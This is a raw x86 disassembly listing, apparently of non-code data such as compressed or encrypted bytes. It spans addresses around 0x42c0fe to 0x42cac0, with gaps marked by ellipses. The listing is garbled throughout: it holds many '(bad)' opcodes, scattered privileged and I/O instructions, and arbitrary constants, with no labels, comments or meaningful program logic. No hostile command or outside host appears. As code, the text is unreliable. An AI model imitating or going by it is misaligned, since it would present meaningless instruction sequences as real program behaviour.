  42c0fe:	and    eax,0x5071c9f7
  42c103:	dec    esi
  42c104:	pop    esp
  42c105:	push   edi
  42c106:	and    ch,BYTE PTR [ecx-0x7dae9746]
  42c10c:	xchg   edi,eax
  42c10d:	fistp  QWORD PTR [ebx]
  42c10f:	enter  0x38fa,0x9f
  42c113:	(bad)  
  42c114:	fidiv  DWORD PTR [ebx]
  42c116:	mov    cl,0x5c
  42c118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c119:	cmp    DWORD PTR [edi+0x43],ebp
  42c11c:	adc    ecx,ebx
  42c11e:	mov    al,0x7c
  42c120:	(bad)  
  42c121:	xchg   ecx,eax
  42c122:	rcr    BYTE PTR [ebx-0x48],0x34
  42c126:	or     al,0x2d
  42c128:	ins    BYTE PTR es:[edi],dx
  42c129:	fs jp  0x42c19e
  42c12c:	jne    0x42c0b2
  42c12e:	ja     0x42c14b
  42c130:	adc    BYTE PTR [eax+0x1ee248],ch
	...
  42c196:	imul   eax,DWORD PTR [edx-0x10105133],0x3fa4c76b
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	inc    ebx
  42c1a3:	mov    esi,0xd7fbec02
  42c1a8:	add    DWORD PTR [eax],eax
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    BYTE PTR [ebx+0x7c],bh
  42c1b0:	xchg   ecx,eax
  42c1b1:	cmp    BYTE PTR [ebp+esi*2+0x5e679fa1],bl
  42c1b8:	pop    edx
  42c1b9:	dec    edx
  42c1ba:	mov    esi,0x567ed631
  42c1bf:	cmp    BYTE PTR [esi-0x26],cl
  42c1c2:	shl    DWORD PTR [edi+edi*2+0x45],0x51
  42c1c7:	inc    BYTE PTR [edx-0x4]
  42c1ca:	add    BYTE PTR [esi-0x43],0x4d
  42c1ce:	loopne 0x42c1b2
  42c1d0:	jb     0x42c198
  42c1d2:	inc    edi
  42c1d3:	xchg   ebx,eax
  42c1d4:	push   ebx
  42c1d5:	int    0xb2
  42c1d7:	jnp    0x42c21e
  42c1d9:	cmc    
  42c1da:	add    DWORD PTR [ecx],edx
  42c1dc:	in     al,dx
  42c1dd:	xchg   ebp,eax
  42c1de:	leave  
  42c1df:	int    0xe6
  42c1e1:	pusha  
  42c1e2:	daa    
  42c1e3:	mov    ebp,0x3d3c0662
  42c1e8:	imul   edi,DWORD PTR [edx-0x30],0xbee80d3c
  42c1ef:	in     al,0x1
  42c1f1:	std    
  42c1f2:	push   ebp
  42c1f3:	out    0x81,eax
  42c1f5:	xor    BYTE PTR [esi+0x45d028dc],dh
  42c1fb:	div    DWORD PTR [si+0x4a]
  42c1ff:	or     cl,BYTE PTR [edi+ebp*4-0x2e50be09]
  42c206:	mov    esp,0x625d9ff
  42c20b:	aad    0x34
  42c20d:	xor    al,bh
  42c20f:	mov    BYTE PTR [ebp-0x62],cl
  42c212:	jbe    0x42c217
  42c214:	in     eax,dx
  42c215:	imul   edi,DWORD PTR [ecx],0xffffffe7
  42c218:	out    0x1b,al
  42c21a:	shl    DWORD PTR [edx+edi*2],1
  42c21d:	push   es
  42c21e:	mov    cl,0x25
  42c220:	inc    edi
  42c221:	icebp  
  42c222:	(bad)  
  42c223:	outs   dx,BYTE PTR ds:[esi]
  42c224:	and    eax,0x5a7880a9
  42c229:	or     esp,DWORD PTR [edi-0x5aeb142c]
  42c22f:	(bad)  
  42c230:	and    eax,0x270ac996
  42c235:	loope  0x42c21f
  42c237:	dec    esi
  42c238:	in     eax,0xbb
  42c23a:	and    eax,0xb5d355f0
  42c23f:	jbe    0x42c2a8
  42c241:	stos   BYTE PTR es:[edi],al
  42c242:	or     DWORD PTR [esi-0x4c326493],eax
  42c248:	cmp    bh,BYTE PTR [ecx-0x7ad8c03f]
  42c24e:	stos   DWORD PTR es:[edi],eax
  42c24f:	icebp  
  42c250:	and    DWORD PTR ds:0xce3588c4,esp
  42c256:	imul   edx,esi,0x8e4799bb
  42c25c:	mov    bl,0x29
  42c25e:	or     al,0xd4
  42c260:	in     al,dx
  42c261:	retf   0xff1d
  42c264:	xchg   esi,eax
  42c265:	hlt    
  42c266:	mov    ebx,0xffbcb70c
  42c26b:	fwait
  42c26c:	cmp    eax,0x99d09b81
  42c271:	loope  0x42c2d0
  42c273:	sub    dh,bh
  42c275:	(bad)  
  42c276:	scas   al,BYTE PTR es:[edi]
  42c277:	adc    DWORD PTR [edi-0x48],esp
  42c27a:	loope  0x42c261
  42c27c:	and    BYTE PTR [edi+0x72f822d4],ch
  42c282:	dec    esp
  42c283:	mov    ah,0x2f
  42c285:	lahf   
  42c286:	es in  eax,0xc3
  42c289:	add    DWORD PTR [esi+esi*8-0x6b],edi
  42c28d:	gs jo  0x42c290
  42c290:	(bad)  
  42c292:	out    dx,al
  42c293:	shl    BYTE PTR [ebx],cl
  42c295:	paddusb mm0,mm0
  42c298:	mov    DWORD PTR [eax],edx
  42c29a:	loop   0x42c242
  42c29c:	stc    
  42c29d:	(bad)  
  42c29e:	push   0xd069c304
  42c2a3:	lds    ecx,FWORD PTR [esp+eiz*8]
  42c2a6:	cli    
  42c2a7:	cs sbb bh,dl
  42c2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2ab:	into   
  42c2ac:	les    esi,FWORD PTR [edi-0x7a]
  42c2af:	jb     0x42c312
  42c2b1:	pop    edx
  42c2b2:	and    edx,DWORD PTR [esi-0x16]
	...
  42c315:	add    dh,ah
  42c317:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    edx,DWORD PTR [esi]
  42c323:	stos   DWORD PTR es:[edi],eax
  42c324:	push   esi
  42c325:	jg     0x42c329
  42c327:	fld    DWORD PTR [ecx]
  42c329:	add    BYTE PTR [edi],al
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    BYTE PTR [ebp+0x74],al
  42c330:	sbb    eax,0x47ddd23b
  42c335:	inc    eax
  42c336:	es jne 0x42c346
  42c339:	push   cs
  42c33a:	xchg   ebx,eax
  42c33b:	mov    ds:0x7c670b26,eax
  42c340:	in     eax,dx
  42c341:	andps  xmm4,xmm4
  42c344:	pop    ss
  42c345:	ret    0x4486
  42c348:	out    dx,al
  42c349:	mov    BYTE PTR [ebx-0x3a],0x3e
  42c34d:	stos   BYTE PTR es:[edi],al
  42c34e:	push   ds
  42c34f:	push   esp
  42c350:	retf   
  42c351:	loop   0x42c2e1
  42c353:	xchg   ebp,eax
  42c354:	pop    ebp
  42c355:	dec    edi
  42c356:	fdivr  QWORD PTR [ecx]
  42c358:	int    0x6a
  42c35a:	sar    DWORD PTR [esi-0x573f9aa],cl
  42c360:	pop    ss
  42c361:	div    ebx
  42c363:	pop    ebp
  42c364:	cmp    ah,BYTE PTR [edx]
  42c366:	xchg   esp,eax
  42c367:	paddd  mm3,QWORD PTR [edi+0x7bcc2bf4]
  42c36e:	das    
  42c36f:	addr16 std 
  42c371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c372:	icebp  
  42c373:	outs   dx,DWORD PTR ds:[esi]
  42c374:	in     eax,dx
  42c375:	lahf   
  42c376:	jle    0x42c3b3
  42c378:	fmul   DWORD PTR [esp+edx*1-0x4c]
  42c37c:	mov    WORD PTR [esi],ds
  42c37e:	sub    al,0x1d
  42c380:	mov    esp,0xb817cb79
  42c385:	rol    DWORD PTR [eax],0x7d
  42c388:	ss inc esi
  42c38a:	and    DWORD PTR [edi-0x5c],ebp
  42c38d:	mov    ebx,esp
  42c38f:	fbld   TBYTE PTR [eax]
  42c391:	dec    esi
  42c392:	ret    
  42c393:	fs xor edx,edi
  42c396:	mov    eax,ds:0x3b650d0e
  42c39b:	push   edi
  42c39c:	stos   DWORD PTR es:[edi],eax
  42c39d:	pop    eax
  42c39e:	scas   al,BYTE PTR es:[edi]
  42c39f:	out    dx,al
  42c3a0:	push   0xffffffa3
  42c3a2:	inc    eax
  42c3a3:	fadd   st,st(6)
  42c3a5:	xor    al,0xa
  42c3a7:	sbb    eax,DWORD PTR [edx+0x20b3a935]
  42c3ad:	cmp    esp,DWORD PTR [edx+0x2569fe1f]
  42c3b3:	ins    BYTE PTR es:[edi],dx
  42c3b4:	dec    ebp
  42c3b5:	(bad)  
  42c3b6:	out    dx,eax
  42c3b7:	rcr    BYTE PTR [ebp-0x44411222],1
  42c3bd:	ffree  st(3)
  42c3bf:	inc    ebx
  42c3c0:	(bad)  
  42c3c1:	or     esp,DWORD PTR [edx+ecx*4]
  42c3c4:	pop    edx
  42c3c5:	xchg   BYTE PTR [esi+eiz*4-0x61],dh
  42c3c9:	mov    dh,0xd3
  42c3cb:	fsub   QWORD PTR [eax-0x12071a0d]
  42c3d1:	(bad)  
  42c3d2:	mov    dl,0x87
  42c3d4:	jae    0x42c388
  42c3d6:	sbb    BYTE PTR [ebp+0xb],bh
  42c3d9:	sbb    eax,0xd89d555e
  42c3de:	fisttp DWORD PTR [ebp-0x465fe228]
  42c3e4:	cmp    edx,eax
  42c3e6:	retf   0x49cc
  42c3e9:	lods   al,BYTE PTR ds:[esi]
  42c3ea:	inc    eax
  42c3eb:	xchg   ebx,eax
  42c3ec:	push   0x43bd108e
  42c3f1:	sub    eax,0xbe2c3940
  42c3f6:	(bad)  
  42c3f7:	xchg   edi,eax
  42c3f8:	lea    edi,[esi-0x77]
  42c3fb:	cmc    
  42c3fc:	mov    bl,0xcc
  42c3fe:	pusha  
  42c3ff:	in     al,dx
  42c400:	jle    0x42c3de
  42c402:	mov    ecx,0x253d8546
  42c407:	rcr    BYTE PTR ds:0x6de9c9da,1
  42c40d:	js     0x42c45a
  42c40f:	(bad)  
  42c410:	hlt    
  42c411:	push   edx
  42c412:	in     al,dx
  42c413:	(bad)  
  42c414:	mov    gs,WORD PTR [edx+0x6a]
  42c417:	xor    eax,0xffffff9b
  42c41a:	mov    esp,0x80051231
  42c41f:	cli    
  42c420:	cs hlt 
  42c422:	push   ebp
  42c423:	or     eax,0xb6bfe98d
  42c428:	mov    esi,0x40f78704
  42c42d:	inc    eax
  42c42e:	push   es
  42c42f:	js     0x42c41f
  42c431:	cdq    
  42c432:	jg     0x42c3d8
  42c434:	ins    BYTE PTR es:[edi],dx
	...
  42c495:	add    ah,ch
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    cl,ch
  42c4a3:	out    dx,al
  42c4a4:	addr16 cld 
  42c4a6:	or     edx,ebx
  42c4a8:	add    DWORD PTR [eax],eax
  42c4aa:	pop    es
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    BYTE PTR [eax],cl
  42c4af:	pop    ds
  42c4b0:	mov    DWORD PTR [ebp-0x5b],ebx
  42c4b3:	in     al,dx
  42c4b4:	sbb    BYTE PTR [eax+0x34],bl
  42c4b7:	mov    dl,0xd3
  42c4b9:	xchg   esp,eax
  42c4ba:	stc    
  42c4bb:	push   es
  42c4bc:	mov    ds:0xd46ebc7c,al
  42c4c1:	loopne 0x42c4f3
  42c4c3:	add    al,0x7e
  42c4c5:	push   es
  42c4c6:	add    bh,al
  42c4c8:	cmp    bh,bh
  42c4ca:	mov    bl,0xdc
  42c4cc:	mov    eax,ds:0x93d8b5dc
  42c4d1:	(bad)  
  42c4d2:	pop    ebx
  42c4d3:	or     dh,ah
  42c4d5:	loopne 0x42c49d
  42c4d7:	sub    al,0xa8
  42c4d9:	aaa    
  42c4da:	ret    
  42c4db:	pop    eax
  42c4dc:	leave  
  42c4dd:	test   ch,cl
  42c4df:	adc    DWORD PTR [edx],0xffffff88
  42c4e2:	mov    ch,0xf7
  42c4e4:	xchg   BYTE PTR [esp+edx*8-0x13],al
  42c4e8:	cmp    DWORD PTR ds:0xcc8ce1cb,0x2d
  42c4ef:	js     0x42c4f9
  42c4f1:	adc    eax,0x3400a96b
  42c4f6:	jge    0x42c48a
  42c4f8:	xor    eax,0xde1866d6
  42c4fd:	pop    ecx
  42c4fe:	xor    BYTE PTR [ebx-0x12],al
  42c501:	out    0x7c,al
  42c503:	adc    al,ch
  42c505:	jno    0x42c520
  42c507:	add    DWORD PTR [edx+0xebb1998],esi
  42c50d:	mov    ss,WORD PTR [edx]
  42c50f:	pop    ss
  42c510:	nop
  42c511:	aad    0x1b
  42c513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c514:	mov    bh,0xc2
  42c516:	mov    al,ds:0xba68ca49
  42c51b:	sub    al,0x82
  42c51d:	popa   
  42c51e:	out    dx,eax
  42c51f:	pop    eax
  42c520:	or     al,0xbf
  42c522:	outs   dx,DWORD PTR ds:[esi]
  42c523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c524:	lds    ecx,FWORD PTR [ebx+0x4450d016]
  42c52a:	xchg   ebx,eax
  42c52b:	loop   0x42c555
  42c52d:	arpl   WORD PTR [ebp-0x6a51e34c],dx
  42c533:	fwait
  42c534:	inc    edx
  42c535:	dec    edi
  42c536:	out    dx,al
  42c537:	add    ecx,edi
  42c539:	int    0x1d
  42c53b:	mov    edi,0x2fb93703
  42c540:	lea    ebp,[ebx]
  42c542:	retf   0xff62
  42c545:	xchg   esi,eax
  42c546:	adc    ch,BYTE PTR [edi-0x28]
  42c549:	add    BYTE PTR es:[ecx],cl
  42c54c:	and    edx,DWORD PTR [ebx]
  42c54e:	mov    ?,WORD PTR [ebx-0x1995f1f7]
  42c554:	nop
  42c555:	mov    ecx,0x2ea0d54a
  42c55a:	mov    ecx,0x3982b627
  42c55f:	mov    eax,ds:0xe2786659
  42c564:	push   edi
  42c565:	lock xchg esp,ebp
  42c568:	add    bh,0x91
  42c56b:	pop    ss
  42c56c:	jp     0x42c592
  42c56e:	push   esp
  42c56f:	repz and eax,0xbdce0eea
  42c575:	xchg   ebx,eax
  42c576:	sbb    edx,DWORD PTR ds:[ecx+0x1f2c200c]
  42c57d:	xor    cl,bh
  42c57f:	mov    edi,0xb2d22102
  42c584:	push   cs
  42c585:	and    dl,BYTE PTR [eax+0x33215064]
  42c58b:	sub    BYTE PTR [ecx+0x6b1a9a4b],ah
  42c591:	dec    ebx
  42c592:	jns    0x42c526
  42c594:	rcl    al,1
  42c596:	mov    al,0x2f
  42c598:	dec    ebx
  42c599:	js     0x42c5f6
  42c59b:	dec    ebp
  42c59c:	pop    ebp
  42c59d:	cld    
  42c59e:	ret    0x3716
  42c5a1:	pop    esp
  42c5a2:	clc    
  42c5a3:	pop    ebx
  42c5a5:	xchg   esp,eax
  42c5a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5a7:	mov    edi,0x828e85a3
  42c5ac:	js     0x42c5a4
  42c5ae:	(bad)  
  42c5b0:	pop    es
  42c5b1:	mov    cs,WORD PTR [eax]
  42c5b3:	fcomi  st,st(4)
	...
  42c615:	add    BYTE PTR [ebp+0x48],bl
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	jo     0x42c626
  42c624:	sahf   
  42c625:	int3   
  42c626:	adc    bl,bl
  42c628:	add    DWORD PTR [eax],eax
  42c62a:	pop    es
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    BYTE PTR [esi-0x393547f3],ah
  42c633:	or     ecx,DWORD PTR [esi-0x23]
  42c636:	mov    esp,0x1c71a23b
  42c63b:	icebp  
  42c63c:	xchg   edi,eax
  42c63d:	xchg   ecx,eax
  42c63e:	out    dx,eax
  42c63f:	fld    TBYTE PTR [esi-0x51]
  42c642:	fild   WORD PTR [edx]
  42c644:	out    0x87,al
  42c646:	add    DWORD PTR [ebx+eiz*4+0xa],edi
  42c64a:	int    0x51
  42c64c:	lods   al,BYTE PTR ds:[esi]
  42c64d:	add    bh,0x4e
  42c650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c651:	and    al,0x14
  42c653:	mov    al,0x3e
  42c655:	xchg   edx,eax
  42c656:	pop    ebp
  42c657:	adc    esi,ebx
  42c659:	or     DWORD PTR [edx+0x74cc9308],ecx
  42c65f:	dec    edx
  42c660:	lds    esi,FWORD PTR [esi-0x4f]
  42c663:	fucom  st(2)
  42c665:	dec    esp
  42c666:	(bad)  
  42c667:	stos   BYTE PTR es:[edi],al
  42c668:	icebp  
  42c669:	std    
  42c66a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c66b:	ficomp DWORD PTR [esp+ebp*1-0x80148d6]
  42c672:	pop    ebp
  42c673:	ss mov dh,0x2c
  42c676:	leave  
  42c677:	push   edx
  42c678:	daa    
  42c679:	js     0x42c611
  42c67b:	xchg   ebp,eax
  42c67c:	jmp    0x42c65c
  42c67e:	jge    0x42c625
  42c680:	loopne 0x42c6fe
  42c682:	push   edx
  42c683:	lea    esi,[eax+0x1]
  42c686:	pop    ebx
  42c687:	mov    esp,gs
  42c689:	add    DWORD PTR [esi-0x5316b061],0x1cc6ac29
  42c693:	test   BYTE PTR [ebx+0x77904c74],ch
  42c699:	daa    
  42c69a:	scas   al,BYTE PTR es:[edi]
  42c69b:	and    DWORD PTR [ebx-0x30e0ae7d],edi
  42c6a1:	int3   
  42c6a2:	ds sub al,0x44
  42c6a5:	inc    ebp
  42c6a6:	xor    ecx,edi
  42c6a8:	pop    ss
  42c6a9:	jle    0x42c6e6
  42c6ab:	fisttp QWORD PTR [eax]
  42c6ad:	out    dx,al
  42c6ae:	jb     0x42c723
  42c6b0:	gs push esp
  42c6b2:	das    
  42c6b3:	jb     0x42c65f
  42c6b5:	aam    0xa4
  42c6b7:	stos   BYTE PTR es:[edi],al
  42c6b8:	int    0x73
  42c6ba:	es push cs
  42c6bc:	sub    ecx,0x70
  42c6bf:	push   esp
  42c6c0:	pop    ebx
  42c6c1:	mov    bl,0x24
  42c6c3:	xchg   esp,eax
  42c6c4:	sub    BYTE PTR [ebp+0x54],cl
  42c6c7:	cmp    eax,0x7e324044
  42c6cc:	push   ecx
  42c6cd:	inc    edi
  42c6ce:	cmp    eax,DWORD PTR [eax]
  42c6d0:	repnz sbb DWORD PTR [eax],0x16
  42c6d4:	pop    eax
  42c6d5:	pop    ebp
  42c6d6:	add    DWORD PTR [edx+0x206710db],0xffffffc1
  42c6dd:	pushf  
  42c6de:	and    DWORD PTR [edx],ebx
  42c6e0:	sub    BYTE PTR [ecx+ebp*1-0x19],0xb4
  42c6e5:	mov    DWORD PTR [esi],edi
  42c6e7:	mov    eax,edx
  42c6e9:	or     ecx,esi
  42c6eb:	cdq    
  42c6ec:	mov    bh,0x4c
  42c6ee:	or     bh,dl
  42c6f0:	dec    edx
  42c6f1:	and    eax,0xa61228bd
  42c6f6:	int    0xf5
  42c6f8:	in     eax,dx
  42c6f9:	fs mov al,0x12
  42c6fc:	mov    edx,0x5845f3d8
  42c701:	ja     0x42c752
  42c703:	inc    edx
  42c704:	sub    eax,0x2e348bfb
  42c709:	dec    ebp
  42c70a:	ja     0x42c72a
  42c70c:	sbb    eax,0x47dd1911
  42c711:	into   
  42c712:	push   0xffffffd3
  42c714:	je     0x42c6aa
  42c716:	push   es
  42c717:	sub    edx,DWORD PTR [esp+edi*1+0x64dbf7b7]
  42c71e:	cmp    DWORD PTR [eax+eiz*8-0x295ce6f2],0xfd5b58c4
  42c729:	push   edi
  42c72a:	repnz fisttp DWORD PTR [edx-0x18ade5cd]
  42c731:	bound  eax,QWORD PTR [ebp+0xbb31]
	...
  42c793:	add    BYTE PTR [eax],al
  42c795:	add    BYTE PTR [eax],bh
  42c797:	mov    DWORD PTR [edx-0x6b],ebp
  42c79a:	sti    
  42c79b:	idiv   edi
  42c79d:	lods   eax,DWORD PTR ds:[esi]
  42c79e:	push   ss
  42c79f:	mov    al,ds:0xd2223f90
  42c7a4:	inc    edx
  42c7a5:	or     DWORD PTR [edi],edx
  42c7a7:	fadd   QWORD PTR [ecx]
  42c7a9:	add    BYTE PTR [edi],al
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    BYTE PTR [esi-0x49],cl
  42c7b0:	xchg   ecx,ecx
  42c7b2:	(bad)  
  42c7b3:	outs   dx,DWORD PTR ds:[esi]
  42c7b4:	dec    edi
  42c7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c7b6:	aad    0xbf
  42c7b8:	fnstcw WORD PTR [edx]
  42c7ba:	push   0x8a82c11e
  42c7bf:	sbb    ebx,edx
  42c7c1:	in     eax,dx
  42c7c2:	(bad)  
  42c7c3:	xchg   esp,eax
  42c7c4:	xor    DWORD PTR [edi-0x42],ecx
  42c7c7:	xor    BYTE PTR ds:0xdcb24b0e,dl
  42c7cd:	cmp    ecx,edi
  42c7cf:	jp     0x42c841
  42c7d1:	push   0xf304ab7b
  42c7d6:	mov    ah,bh
  42c7d8:	dec    ebp
  42c7d9:	(bad)  
  42c7da:	in     eax,dx
  42c7db:	jle    0x42c817
  42c7dd:	stos   DWORD PTR es:[edi],eax
  42c7de:	in     al,0x14
  42c7e0:	fwait
  42c7e1:	pop    es
  42c7e2:	xchg   edx,eax
  42c7e3:	inc    esi
  42c7e4:	add    bl,BYTE PTR [esi-0x14]
  42c7e7:	adc    ebx,ebx
  42c7e9:	fimul  WORD PTR [ebx-0x69c014ae]
  42c7ef:	outs   dx,BYTE PTR ds:[esi]
  42c7f0:	cmc    
  42c7f1:	xchg   BYTE PTR [ebx+esi*8],ah
  42c7f4:	mov    al,ds:0xeb157853
  42c7f9:	lds    esp,FWORD PTR ds:0x916aeadc
  42c7ff:	xchg   BYTE PTR [esi-0x26],dl
  42c802:	cmp    ebp,esi
  42c804:	out    0x69,eax
  42c806:	imul   ebp,DWORD PTR [edx],0x7432574b
  42c80c:	shl    dh,cl
  42c80e:	adc    eax,0xef233ea6
  42c813:	ror    dl,0x3
  42c816:	push   ecx
  42c817:	pop    ebp
  42c818:	or     ecx,ebx
  42c81a:	inc    edi
  42c81b:	pop    eax
  42c81c:	iret   
  42c81d:	retf   
  42c81e:	fisttp QWORD PTR [edx]
  42c820:	adc    ah,BYTE PTR [ebx]
  42c822:	add    BYTE PTR [ebp-0x34d600e2],0x61
  42c829:	ins    DWORD PTR es:[edi],dx
  42c82a:	dec    ebx
  42c82b:	xor    al,0xa
  42c82d:	test   BYTE PTR [ecx],cl
  42c82f:	sbb    dh,BYTE PTR [edx]
  42c831:	and    edx,edi
  42c833:	loopne 0x42c843
  42c835:	jle    0x42c7c9
  42c837:	xchg   edx,eax
  42c838:	int    0x26
  42c83a:	test   DWORD PTR [edi],ebx
  42c83c:	mov    esp,0x2593742b
  42c841:	or     al,0xfa
  42c843:	sbb    bh,dl
  42c845:	mov    cl,0x2e
  42c847:	jp     0x42c883
  42c849:	ss push es
  42c84b:	(bad)  
  42c84c:	cmp    DWORD PTR [edi-0xb776030],ecx
  42c852:	or     cl,BYTE PTR [edi+0x21]
  42c855:	xchg   esp,eax
  42c856:	mov    al,0xea
  42c858:	test   eax,0xd80ed909
  42c85d:	dec    ebp
  42c85e:	push   edx
  42c85f:	mov    ds:0x65d5b45a,eax
  42c864:	pop    ss
  42c865:	mov    eax,0x31c770fa
  42c86a:	sahf   
  42c86b:	push   ebp
  42c86c:	fiadd  WORD PTR [edi+eax*2-0x32]
  42c870:	cmp    esp,ecx
  42c872:	jle    0x42c81e
  42c874:	push   ebx
  42c875:	mov    BYTE PTR [edi+0x30],bl
  42c878:	je     0x42c8ad
  42c87a:	cmp    eax,ebp
  42c87c:	rol    ecx,1
  42c87e:	sub    al,0xfb
  42c880:	or     eax,0x3286fb79
  42c885:	scas   eax,DWORD PTR es:[edi]
  42c886:	das    
  42c887:	pop    esi
  42c888:	std    
  42c889:	xchg   ebp,eax
  42c88a:	ja     0x42c8f9
  42c88c:	addr16 xchg ebx,eax
  42c88e:	in     al,dx
  42c88f:	mov    ah,0x73
  42c891:	push   edx
  42c892:	lods   al,BYTE PTR ds:[esi]
  42c893:	push   cs
  42c894:	jnp    0x42c885
  42c896:	pop    ebp
  42c897:	nop
  42c898:	mov    eax,0x51edea7f
  42c89d:	loopne 0x42c8ab
  42c89f:	jb     0x42c85c
  42c8a1:	push   cs
  42c8a2:	mov    eax,ds:0x3595c66a
  42c8a7:	mov    ch,0x4c
  42c8a9:	adc    ecx,edi
  42c8ab:	xor    cl,BYTE PTR [ebp+ecx*4+0x5c16a60b]
  42c8b2:	outs   dx,BYTE PTR ds:[esi]
  42c8b3:	cwde   
  42c8b4:	js     0x42c8b6
	...
  42c916:	adc    BYTE PTR [ebx],bl
  42c918:	leave  
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	sub    dh,BYTE PTR [esi-0x60]
  42c925:	mov    eax,0x1dd1e
  42c92a:	pop    es
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR [esi+0x3],dl
  42c930:	and    BYTE PTR cs:[ebp-0xb7de10],cl
  42c937:	mov    bh,0x12
  42c939:	or     ch,ch
  42c93b:	jo     0x42c976
  42c93d:	lds    edi,FWORD PTR [esi]
  42c93f:	ss push edx
  42c941:	sbb    ch,dh
  42c943:	jo     0x42c902
  42c945:	imul   eax,ebx,0x6ed115c5
  42c94b:	cli    
  42c94c:	mov    bl,0x66
  42c94e:	and    esi,DWORD PTR [eax]
  42c950:	in     al,0x9e
  42c952:	js     0x42c97a
  42c954:	jns    0x42c964
  42c956:	and    BYTE PTR [edi-0x1969ba33],cl
  42c95c:	cld    
  42c95d:	xchg   ecx,eax
  42c95e:	or     eax,0xc33b580d
  42c963:	stc    
  42c964:	shr    ebx,cl
  42c966:	mov    ecx,ebx
  42c968:	xchg   DWORD PTR [edx],edx
  42c96a:	jmp    FWORD PTR [ebx]
  42c96c:	stos   DWORD PTR es:[edi],eax
  42c96d:	add    bl,BYTE PTR [ecx+ebp*2+0x50]
  42c971:	mov    edi,DWORD PTR [edx+0x6b]
  42c974:	jb     0x42c92d
  42c976:	sub    al,0x4
  42c978:	retf   0xf39a
  42c97b:	test   BYTE PTR [esi+edx*8+0x3b],ah
  42c97f:	icebp  
  42c980:	push   ds
  42c981:	xor    eax,0xc3fd2b82
  42c986:	out    0xc9,al
  42c988:	pop    edx
  42c989:	push   eax
  42c98a:	pop    ss
  42c98b:	cs (bad) 
  42c98d:	xor    eax,edi
  42c98f:	sahf   
  42c990:	int3   
  42c991:	fsub   st,st(2)
  42c993:	push   edx
  42c994:	pop    edx
  42c995:	mov    ds:0x83958288,al
  42c99a:	xchg   edi,eax
  42c99b:	int3   
  42c99c:	dec    bp
  42c99e:	stc    
  42c99f:	in     eax,0x6a
  42c9a1:	inc    edi
  42c9a2:	sti    
  42c9a3:	push   es
  42c9a4:	xchg   DWORD PTR [edx+ebp*8-0x38],edx
  42c9a8:	jnp    0x42c9ab
  42c9aa:	lock fld DWORD PTR [esi+eax*1+0x3f]
  42c9af:	(bad)  
  42c9b0:	jge    0x42c963
  42c9b2:	or     al,0x7
  42c9b4:	cs pop edx
  42c9b6:	pop    esi
  42c9b7:	sbb    ebx,DWORD PTR [esi-0x18]
  42c9ba:	mov    dh,0xce
  42c9bc:	bsf    esp,DWORD PTR [edi-0x2b]
  42c9c0:	fisubr WORD PTR [esi+0x465558f1]
  42c9c6:	xchg   BYTE PTR [ecx-0xdeadd24],dh
  42c9cc:	shr    BYTE PTR [eax+0x0],0xc3
  42c9d0:	sbb    esi,edi
  42c9d2:	ss mov esi,0xd78d5c80
  42c9d8:	(bad)  
  42c9da:	add    eax,0x735c7232
  42c9df:	sar    eax,0xaa
  42c9e2:	aam    0x2c
  42c9e4:	cli    
  42c9e5:	pop    edi
  42c9e6:	nop
  42c9e7:	idiv   BYTE PTR [esi+0x12]
  42c9ea:	jle    0x42c9ac
  42c9ec:	mov    ds:0x13bff325,al
  42c9f1:	imul   esp,edi,0xffffffaa
  42c9f4:	ror    BYTE PTR [ecx+eax*2+0x10],0xbc
  42c9f9:	lea    edx,[ecx-0x74e4f8d8]
  42c9ff:	rcr    DWORD PTR [ebp-0x3223bf5a],cl
  42ca05:	or     eax,0xe45c9d12
  42ca0a:	(bad)  
  42ca0b:	int    0x25
  42ca0d:	xchg   esi,eax
  42ca0e:	add    dh,al
  42ca10:	mov    bh,0xc1
  42ca12:	int3   
  42ca13:	pop    edi
  42ca14:	mov    ebp,0xc89326ae
  42ca19:	cmp    DWORD PTR [ecx+0x60ccc5d],ebp
  42ca1f:	fs iret 
  42ca21:	or     eax,0xd19f7146
  42ca26:	(bad)  
  42ca27:	cld    
  42ca28:	push   edi
  42ca29:	mov    ah,0x3b
  42ca2b:	xchg   edx,eax
  42ca2c:	or     dh,BYTE PTR [eax+0x55112eb8]
  42ca32:	inc    ebx
  42ca33:	add    ebp,DWORD PTR [edx+0x0]
	...
  42ca96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca97:	fimul  DWORD PTR [eax-0x10ac02bf]
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0x11ce4df5,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    cl,bh
  42caaf:	inc    eax
  42cab0:	test   al,0x28
  42cab2:	cli    
  42cab3:	into   
  42cab4:	in     eax,dx
  42cab5:	xor    eax,0x2aff90a0
  42caba:	xchg   ebx,eax
  42cabb:	jp     0x42cab7
  42cabd:	push   edx
  42cabe:	jae    0x42caf7
  42cac0:	jbe    0x42cb25
